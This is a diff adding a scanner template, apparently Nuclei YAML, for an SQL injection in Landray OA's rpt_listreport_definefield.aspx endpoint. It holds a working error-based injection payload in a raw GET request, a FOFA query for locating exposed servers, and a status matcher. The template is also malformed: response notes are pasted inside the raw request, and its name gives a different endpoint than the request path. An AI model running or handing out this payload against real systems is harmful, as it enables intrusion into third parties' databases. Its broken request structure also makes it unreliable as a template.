@@ -1,0 +1,34 @@
+id: poc-mgxapxlgbu7zduhx
+info:
+  name: 蓝凌OA frpt_listreport_definefield.aspx接口存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mgxapxlgbu7zduhx'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: mgxapxlgbu7zduhx
+    fofa: icon_hash="953405444"||app="Landray-OA系统"
+http:
+- raw:
+  - 'GET /SM/rpt_listreport_definefield.aspx?ID=2%20and%201=@@version--+ HTTP/1.1
+
+
+    # 响应代码特征
+
+    500
+
+
+    # 响应内容特征
+
+    nvarchar
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 500
+    type: status
